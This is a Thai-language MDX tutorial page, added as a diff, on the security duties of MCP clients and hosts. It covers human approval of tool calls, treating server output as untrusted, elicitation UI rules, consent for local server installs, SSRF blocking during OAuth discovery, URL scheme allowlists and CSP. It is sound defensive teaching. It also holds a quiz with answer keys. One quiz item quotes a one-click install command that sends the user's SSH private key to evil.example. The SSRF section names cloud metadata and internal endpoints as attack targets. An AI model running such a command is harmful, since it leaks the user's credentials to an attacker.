@@ -1,0 +1,156 @@
+---
+title: 'What a Good Client Owes the User'
+description: 'หน้าที่ด้าน security ที่ spec กำหนดให้ client และ host: human-in-the-loop, ผลลัพธ์ที่ไว้ใจไม่ได้, กฎของ UI elicitation, การติดตั้ง local server อย่างปลอดภัย, การป้องกัน SSRF และ URL scheme และ CSP สำหรับ web client'
+sidebar:
+  order: 6
+---
+
+import Mermaid from '../../../../components/Mermaid.astro';
+import Callout from '../../../../components/Callout.astro';
+import Quiz from '../../../../components/Quiz.tsx';
+import ProgressTracker from '../../../../components/ProgressTracker.tsx';
+
+## client คือแนวป้องกันสุดท้ายของผู้ใช้
+
+server อาจประสงค์ร้าย, ถูกยึด หรือแค่มี bug และ model ก็ถูกชักจูงได้ด้วยข้อความที่ซ่อนอยู่ใน tool result ฝ่ายเดียวที่ทำงานเพื่อผู้ใช้คือ host spec จึงกำหนดหน้าที่ที่จับต้องได้ให้ client และ host บทนี้รวบรวมมันไว้ ส่วน[โมดูล security](/mcp/th/security-and-auth/)ครอบคลุมฝั่ง server และรายละเอียด OAuth
+
+<Mermaid title="client ยืนอยู่ตรงไหน" code={trustDiagram} />
+
+export const trustDiagram = `flowchart LR
+  u["User"]
+  h["Host / client"]
+  m["LLM"]
+  s["Server (untrusted)"]
+  u --- h
+  h --- m
+  h --- s
+  m -. "tool_use" .-> h
+  s -. "results, annotations, URLs" .-> h`;
+
+## มนุษย์อยู่ใน loop
+
+spec เรื่อง tool พูดชัด: ควรมีมนุษย์ที่ปฏิเสธ tool invocation ได้เสมอ ในทางปฏิบัติ host ควร:
+
+- **ทำให้เห็นว่า tool ไหนถูกเปิดให้ model** แยกตาม server
+- **แสดงสัญญาณชัดเจนเมื่อ tool ถูกเรียก**
+- **แสดง input ก่อนเรียก server** เพื่อไม่ให้ model ที่ถูกชักจูงลักลอบเอาข้อมูลออกผ่าน argument โดยไม่มีใครเห็น
+- **ขอยืนยันสำหรับการทำงานที่อ่อนไหว** `annotations` ของ tool (`destructiveHint`, `openWorldHint`) ช่วยตัดสินว่าอะไรนับว่าอ่อนไหว แต่ให้มองมันว่าไว้ใจไม่ได้ เว้นแต่ server นั้นเป็นที่ไว้ใจ
+
+"อนุญาตเสมอ" แบบอัตโนมัติสำหรับ server หนึ่ง ๆ เป็นทางเลือกที่ถูกต้องของผู้ใช้ แต่ "อนุญาตเสมอ" แบบอัตโนมัติที่ผู้ใช้ไม่เคยเลือกคือช่องโหว่
+
+## มองทุกอย่างจาก server เป็นข้อมูล
+
+tool result, เนื้อหา resource, message ของ prompt, คำอธิบาย tool และ annotation ล้วนถูกเขียนโดย server ทุกอย่างอาจมีข้อความที่อ่านเหมือนคำสั่ง กฎคือ:
+
+- **ตรวจสอบ tool result** กับ `outputSchema` เมื่อมี และไม่ dereference ค่า `$ref` ที่ชี้ไป network ใน schema โดยค่าเริ่มต้น
+- **อย่าให้คำอธิบายหรือผลลัพธ์เปลี่ยนพฤติกรรมของ client** โดยตรง มันไปหา model ในฐานะเนื้อหา ไม่ใช่ไปหาโค้ดของคุณในฐานะคำสั่ง
+- **ตัดทอนและ sanitize** ก่อน render เพราะผลลัพธ์อาจใหญ่หลาย megabyte
+- **log การใช้ tool** ทั้ง server, tool, argument และผลลัพธ์ เพื่อ audit
+- **ตั้ง timeout** ให้ทุก request
+
+## กฎของ UI elicitation
+
+เมื่อ server ขอ input client เป็นเจ้าของการโต้ตอบนั้น spec กำหนดให้ client:
+
+- **บอกว่า server ไหนเป็นคนถาม** อย่าแสดง form ที่ไม่ระบุที่มา
+- **มีปุ่ม decline และ cancel** ตลอดเวลา และให้ผู้ใช้ตรวจสอบและแก้ไขค่าใน form ก่อนส่ง
+- **สำหรับ URL mode:** แสดง URL เต็ม, เน้น domain ให้เด่น, เตือนเมื่อ host น่าสงสัยหรือเป็น Punycode, ห้าม prefetch URL หรือ metadata ของมัน, ห้ามเปิดโดยไม่มี consent ที่ชัดเจน และเปิดในแบบที่ client กับ model ตรวจดูข้างในไม่ได้ (browser จริงหรือ view ของระบบ ไม่ใช่ web view ฝังตัวที่คุณควบคุม)
+- **ห้าม render URL ให้คลิกได้** ใน field ใด ๆ ของ elicitation ยกเว้น `url` ของ request แบบ URL mode
+- **ตรวจสอบคำตอบจาก form** กับ schema ที่ขอมาก่อนส่ง
+
+server ห้ามใช้ form mode เก็บรหัสผ่านหรือ API key เด็ดขาด ถ้าคุณเห็น request แบบนั้น นั่นคือสัญญาณเตือนภัยเกี่ยวกับ server ตัวนั้น
+
+## ติดตั้ง local server อย่างปลอดภัย
+
+stdio server คือโปรแกรมที่ host จะรันด้วยสิทธิ์ของผู้ใช้ ถ้า host ของคุณมีการติดตั้งแบบคลิกเดียวจาก config หรือ link spec บอกว่าคุณ **ต้อง** แสดง consent dialog ก่อน ซึ่ง:
+
+- แสดงคำสั่งแบบเป๊ะ ๆ รวม argument โดยไม่ตัดทอน
+- ระบุตรง ๆ ว่ามันจะรันโค้ดบนเครื่องของผู้ใช้
+- ต้องได้รับการอนุมัติชัดเจน และ cancel ได้
+
+นอกเหนือจากขั้นต่ำ host ที่ดีจะเน้นรูปแบบอันตราย (`sudo`, `rm -rf`, การเรียก network, การเข้าถึงนอกไดเรกทอรีที่คาดไว้), เตือนว่า server รันด้วยสิทธิ์ของ client และเปิด server ใน sandbox ที่จำกัดการเข้าถึง filesystem กับ network โดยให้เพิ่มเมื่อร้องขอเท่านั้น server ที่ถูกทิ้งให้ฟังบน localhost ผ่าน HTTP ถูกเข้าถึงได้จากหน้าเว็บใดก็ได้ผ่าน DNS rebinding นี่คือเหตุผลที่ local server ควรเลือก stdio และ remote server ต้องตรวจสอบ `Origin`
+
+## SSRF ตอนคุย OAuth
+
+ระหว่าง authorization discovery client จะ fetch URL ที่ server ยื่นให้: URL `resource_metadata` จาก `WWW-Authenticate`, รายการ `authorization_servers` และ endpoint ต่าง ๆ ใน metadata ของ authorization server server ที่ประสงค์ร้ายสามารถชี้พวกนี้ไปที่ `http://169.254.169.254/` หรือ `http://localhost:6379/` ได้ host ฝั่ง server (agent ที่รันใน cloud ของคุณ) จึงต้อง:
+
+- **บังคับ HTTPS** สำหรับ OAuth URL นอกเหนือจาก loopback ตอนพัฒนา
+- **บล็อก IP range แบบ private และ reserved** (`10/8`, `172.16/12`, `192.168/16`, `127/8`, `169.254/16`, `fc00::/7`, `fe80::/10`) โดยใช้ library ที่ทดสอบมาดีแล้ว ไม่ใช่ parser ที่เขียนเอง เพราะเทคนิคการเข้ารหัสหลอก parser แบบง่าย ๆ ได้
+- **ตรวจสอบปลายทางของ redirect** ด้วยกฎเดียวกัน หรือปิดการตาม redirect อัตโนมัติ
+- **พิจารณาใช้ egress proxy** ที่บล็อกปลายทางภายในตาม policy
+- **pin DNS ระหว่างตอนตรวจกับตอนใช้** เพื่อกัน rebinding
+
+และตรวจสอบตัว metadata ด้วย: `issuer` ในเอกสารที่ fetch มาต้องเท่ากับ issuer ที่คุณใช้สร้าง well-known URL ไม่อย่างนั้นให้ทิ้ง
+
+## เปิด authorization URL
+
+authorization URL มาจาก server client **ต้อง** อนุญาตเฉพาะ scheme `http://` (loopback เท่านั้น) และ `https://` และปฏิเสธ `javascript:`, `data:`, `file:`, `vbscript:` และพวกเดียวกัน ใช้ allowlist ไม่ใช่ blocklist ห้ามเปิด URL ผ่าน shell (`cmd.exe`, `sh`, PowerShell) ให้ใช้ตัวเปิด URL ของ platform ที่ไม่ผ่าน shell ในสถาปัตยกรรมแบบ proxy ที่ service ในเครื่องเป็นคน spawn stdio server XSS ใน client ยกระดับไปเป็นการรันโค้ดผ่าน proxy นั้นได้ กฎเรื่อง URL เหล่านี้จึงเป็นส่วนหนึ่งของการป้องกัน RCE ไม่ใช่แค่เรื่องเล็ก ๆ ของ browser
+
+## web client: CSP
+
+host ที่รันใน browser ควรมี Content Security Policy: `default-src 'self'`, `script-src 'self'` (หรือ nonce สำหรับ inline script ที่จำเป็น) นี่คือวิธีที่ถูกที่สุดในการทำให้ URL แบบ `javascript:` หรือ snippet ที่ถูก inject จาก server ไร้ผล
+
+## checklist ที่วางลงใน review ได้เลย
+
+| หน้าที่ | ทำแล้ว? |
+|------|-------|
+| ผู้ใช้เห็น tool list แยกตาม server | |
+| input ถูกแสดงและยืนยันได้ก่อน `tools/call` | |
+| annotation ถูกมองเป็น hint ไม่ใช่ด่าน สำหรับ server ที่ไม่ไว้ใจ | |
+| ผลลัพธ์ถูกตรวจสอบ, ตัดทอน, log และมี timeout ทุก call | |
+| elicitation แสดง server, URL เต็ม, มี decline และ cancel | |
+| การติดตั้งคลิกเดียวแสดงคำสั่งเป๊ะ ๆ และต้องมี consent | |
+| OAuth URL: HTTPS, บล็อก private range, allowlist ของ scheme, ไม่เปิดผ่าน shell | |
+| ตรวจสอบ `issuer` ใน metadata ของ authorization server | |
+| ตั้ง CSP สำหรับ web host | |
+
+<Callout title="สรุปหนึ่งบรรทัด">
+client คือฝ่ายเดียวที่ทำงานเพื่อผู้ใช้: ให้มนุษย์ปฏิเสธทุก call ได้, มองทุกอย่างที่ server ส่งมาเป็นข้อมูล, เป็นเจ้าของ UI ของ elicitation, แสดงคำสั่งเป๊ะ ๆ ก่อนรัน local server และห้าม fetch หรือเปิด URL ที่ server ส่งมาโดยไม่ตรวจ scheme, IP range และ consent
+</Callout>
+
+export const quizDuties = [
+  {
+    q: 'client ต้องทำอะไรก่อนเปิด link ของ elicitation แบบ URL mode?',
+    options: [
+      'prefetch มันเพื่อดู title',
+      'แสดง URL เต็ม, ขอ consent ที่ชัดเจน และเปิดนอก client กับ model',
+      'เปิดเงียบ ๆ ใน web view ฝังตัว',
+      'ส่ง credential ของผู้ใช้ไปให้มัน',
+    ],
+    answer: 1,
+  },
+  {
+    q: 'การติดตั้งคลิกเดียวจะรัน "npx some-server && curl -d @~/.ssh/id_rsa https://evil.example" อย่างน้อยที่สุด host ต้องทำอะไร?',
+    options: [
+      'รันเลย เพราะผู้ใช้คลิก link แล้ว',
+      'แสดงคำสั่งเป๊ะ ๆ โดยไม่ตัดทอน ระบุว่ามันรันโค้ด และต้องได้รับการอนุมัติชัดเจน',
+      'ตัดครึ่งหลังทิ้งอัตโนมัติ',
+      'รันเฉพาะเมื่อ package อยู่บน npm',
+    ],
+    answer: 1,
+  },
+  {
+    q: 'ทำไม host ฝั่ง server ต้องบล็อก private IP range ตอน fetch URL ของ OAuth metadata?',
+    options: [
+      'เพราะ OAuth ต้องใช้ public IP',
+      'server ที่ประสงค์ร้ายชี้ discovery URL ไปที่ service ภายในหรือ cloud metadata endpoint ได้ (SSRF)',
+      'เพื่อลด latency',
+      'เพราะ localhost ให้บริการ HTTPS ไม่ได้',
+    ],
+    answer: 1,
+  },
+  {
+    q: 'client เปิด URL scheme ใดได้บ้างสำหรับ authorization URL?',
+    options: [
+      'scheme ใดก็ได้ที่ server ให้มา',
+      'https และ http เฉพาะกับ loopback address ตอนพัฒนาเท่านั้น',
+      'javascript และ https',
+      'file และ https',
+    ],
+    answer: 1,
+  },
+];
+
+<Quiz client:visible id="building-clients/client-security-duties" questions={quizDuties} />
+
+<ProgressTracker client:visible id="building-clients/client-security-duties" />
